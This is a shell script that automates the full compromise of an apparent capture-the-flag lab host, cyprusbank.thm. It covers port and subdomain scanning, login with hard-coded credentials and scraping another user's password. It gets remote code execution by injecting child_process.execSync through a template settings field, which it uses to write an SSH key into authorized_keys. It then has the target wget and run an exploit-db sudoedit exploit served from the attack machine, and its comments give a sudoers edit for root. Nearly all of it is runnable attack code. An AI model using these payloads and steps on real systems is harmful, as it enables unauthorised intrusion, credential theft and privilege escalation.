#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.169.220"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Parse arguments from flags
passphrase=""
while getopts p: flag
do
    case "${flag}" in
        p) passphrase=${OPTARG};;
    esac
done

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - RECONNAISSANCE"
nmap -p- -Pn -sC -sV -A -sS -T4 ${target_ip} > $result_folder/nmap-results.txt

echo "2 - ANALYZE WEBSITE"
echo "2.1 - Find subdomain"
echo "$target_ip cyprusbank.thm" >> /etc/hosts
gobuster dir -u http://$target_ip -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,sh,txt,cgi,jpg,png,html,js,css,py -o $result_folder/directories.txt
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cyprusbank.thm/ -H "Host:FUZZ.cyprusbank.thm" -t 200  -o $result_folder/dns.txt -fs 57
DOMAIN=$(jq -r '.results[1].input.FUZZ' $result_folder/dns.txt)
echo "---> Found subdomain $DOMAIN"

echo "2.2 - Gather Olivia Cortez data"
echo "$target_ip    cyprusbank.thm  $DOMAIN.cyprusbank.thm" >> /etc/hosts
curl -s -L "http://$DOMAIN.cyprusbank.thm/login" -c "/work/results/cookies.txt" -o "$result_folder/olivia.html" -H "Host:$DOMAIN.cyprusbank.thm" -H "Connection:keep-alive" -H "Origin:http://$DOMAIN.cyprusbank.thm" -H "Content-Type: application/x-www-form-urlencoded" -d "username=Olivia+Cortez&password=olivi8"
curl -s -L "http://$DOMAIN.cyprusbank.thm/search?name=Wellick" -b "/work/results/cookies.txt" -o "$result_folder/wellick.html" -H "Host:$DOMAIN.cyprusbank.thm" -H "Connection:keep-alive" -H "Origin:http://$DOMAIN.cyprusbank.thm" 
curl -s -L "http://$DOMAIN.cyprusbank.thm/messages/?c=30" -b "/work/results/cookies.txt" -o "$result_folder/messages.html" -H "Host:$DOMAIN.cyprusbank.thm" -H "Connection:keep-alive" -H "Origin:http://$DOMAIN.cyprusbank.thm" 
USERNAME=$(cat $result_folder/messages.html | sed -n 's/.*<strong>\(.*\)Of course!.*/\1/p' | sed 's|</strong>:  ||g')
PASSWORD=$(cat $result_folder/messages.html | sed -n 's/.*My password is &#39;\(.*\)&#39;<\/p>/\1/p')
echo "---> '$USERNAME' password is '$PASSWORD'"

echo "2.3 - Gather $USERNAME data"
curl -s -L "http://$DOMAIN.cyprusbank.thm/login" -c "/work/results/cookies.txt" -o "$result_folder/gayle.html" -H "Host:$DOMAIN.cyprusbank.thm" -H "Connection:keep-alive" -H "Origin:http://$DOMAIN.cyprusbank.thm" -H "Content-Type: application/x-www-form-urlencoded" -d "username=$USERNAME&password=$PASSWORD"
curl -s -L "http://$DOMAIN.cyprusbank.thm/search?name=Wellick" -b "/work/results/cookies.txt" -o "$result_folder/wellick2.html" -H "Host:$DOMAIN.cyprusbank.thm" -H "Connection:keep-alive" -H "Origin:http://$DOMAIN.cyprusbank.thm" 
PHONE=$(cat $result_folder/wellick2.html | sed -n 's/.*<td>\(.*\)<\/td>/\1/p' | tail -1)
echo "---> Wellick phone is '$PHONE'"

echo "3 - INTRUSION"
curl -s -L "http://$DOMAIN.cyprusbank.thm/settings" -b "/work/results/cookies.txt" -o "$result_folder/error.html" -H "Host:$DOMAIN.cyprusbank.thm" -H "Connection:keep-alive" -H "Origin:http://$DOMAIN.cyprusbank.thm" -d "name=test"
ACCOUNT=$(cat $result_folder/error.html | sed -n 's/.*home\(.*\)app.*/\1/p' | tr -d '/')
echo "---> Unix user account is '$ACCOUNT'"

SSHKEY=$(cat /home/thm/.ssh/id_ed25519.pub | sed 's/+/%2B/g' | sed 's/ /+/g')
curl -s -L "http://$DOMAIN.cyprusbank.thm/settings" -b "/work/results/cookies.txt" -o /dev/null -H "Host:$DOMAIN.cyprusbank.thm" -H "Connection:keep-alive" -H "Origin:http://$DOMAIN.cyprusbank.thm" -d "name=test&password=test&settings[view+options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('mkdir+/home/web/.ssh');s"
curl -s -L "http://$DOMAIN.cyprusbank.thm/settings" -b "/work/results/cookies.txt" -o /dev/null -H "Host:$DOMAIN.cyprusbank.thm" -H "Connection:keep-alive" -H "Origin:http://$DOMAIN.cyprusbank.thm" -d "name=test&password=test&settings[view+options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('echo+$SSHKEY+>+/home/$ACCOUNT/.ssh/authorized_keys');s"

sshpass -P assphrase -p $passphrase ssh -o StrictHostKeyChecking=no -i /home/thm/.ssh/id_ed25519 $ACCOUNT@$target_ip "cat user.txt" > $result_folder/user.txt

echo "4 - PRIVILEGE ESCALATION"

# Identify sudo rights
sshpass -P assphrase -p $passphrase ssh -o StrictHostKeyChecking=no -i /home/thm/.ssh/id_ed25519 $ACCOUNT@$target_ip "sudo -l" > $result_folder/sudo.txt

# Check sudoedit for vulnerabilities
curl -s -X GET https://www.exploit-db.com/download/51217 -o $result_folder/51217.sh
dos2unix $result_folder/51217.sh
python3 -m http.server -d $result_folder 4444 &
PID=$!
sshpass -P assphrase -p $passphrase ssh -o StrictHostKeyChecking=no -i /home/thm/.ssh/id_ed25519 $ACCOUNT@$target_ip "wget http://10.9.5.12:4444/51217.sh"
kill -9 $PID
sshpass -P assphrase -p $passphrase ssh -o StrictHostKeyChecking=no -i /home/thm/.ssh/id_ed25519 $ACCOUNT@$target_ip "chmod +x 51217.sh"
timeout 5 sshpass -P assphrase -p $passphrase ssh -o StrictHostKeyChecking=no -i /home/thm/.ssh/id_ed25519 $ACCOUNT@$target_ip "./51217.sh" > $result_folder/sudoedit.txt

# Exploit -- required to be logged in
# 1) export EDITOR="vi -- /etc/sudoers"
# 2) sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
# 3) Add web ALL=(root) NOPASSWD: ALL to the sudoers file.
# 4) sudo cat /root/root.txt
